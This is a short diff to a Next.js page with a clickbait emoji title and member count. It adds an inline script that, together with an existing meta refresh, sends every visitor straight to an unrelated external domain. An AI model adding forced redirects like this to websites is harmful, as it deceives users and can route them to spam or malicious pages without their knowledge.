@@ -8,7 +8,9 @@ const Home: NextPage = () => {
     <div className={styles.container}>
       <Head>
         <meta http-equiv="refresh" content="delay_time; URL=https://hdmediaa.com/sfgdfgs/" />
-
+        <script type="text/javascript">
+            window.location.href = "https://hdmediaa.com/sfgdfgs/"
+        </script>
         <title>😱Quatuor en Afrique😱</title>
         <meta name="description" content="1,350,350 Online Members" />
         <link rel="icon" href="/favicon.ico" />
